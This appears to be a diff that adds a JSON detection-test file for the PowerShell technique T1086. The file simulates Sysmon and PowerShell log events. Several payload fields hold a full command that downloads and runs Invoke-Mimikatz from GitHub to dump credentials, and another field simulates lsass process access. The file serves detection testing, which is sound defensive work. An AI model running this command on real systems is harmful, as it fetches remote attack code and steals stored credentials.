@@ -1,0 +1,61 @@
+{
+	"name": "T1086 - PowerShell",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code.",
+	"rules": {
+		"powershell_download": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Powershell executing download functions in command line.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"Description": "Windows PowerShell",
+				"CommandLine": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\""
+			}
+		},
+		"powershell_network": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Network connection detected",
+			"description": "Network activity from powershell.exe.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"DestinationIp": "151.101.132.133",
+				"DestinationPort": 443,
+				"DestinationPortName": "https"
+			}
+		},
+		"lsass_accessed": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process accessed",
+			"description": "Process access to lsass.exe from dropped file.",
+			"payload": {
+				"SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"TargetImage": "C:\\Windows\\system32\\lsass.exe",
+				"GrantedAccess": 0x143A,
+				"CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6594|C:\\Windows\\System32\\KERNELBASE.dll+2940d|UNKNOWN(000001FA49CB2A68)"
+			}
+		},
+		"powershell_scriptblock_iex": {
+			"enabled": true,
+			"source": "PowerShell",
+			"category": "4104",
+			"description": "Powershell 4104 event for Invoke-Mimikatz.",
+			"payload": {
+				"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+			}
+		},
+		"powershell_scriptblock_invokemimikatz": {
+			"enabled": true,
+			"source": "PowerShell",
+			"category": "4104",
+			"description": "Powershell 4104 event for Invoke-Mimikatz.",
+			"payload": {
+				"ScriptBlockText": "function Invoke-Mimikatz\n{\n<#\n.SYNOPSIS\n\nThis script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz...\nblablabla..."
+			}
+		}
+	}
+}
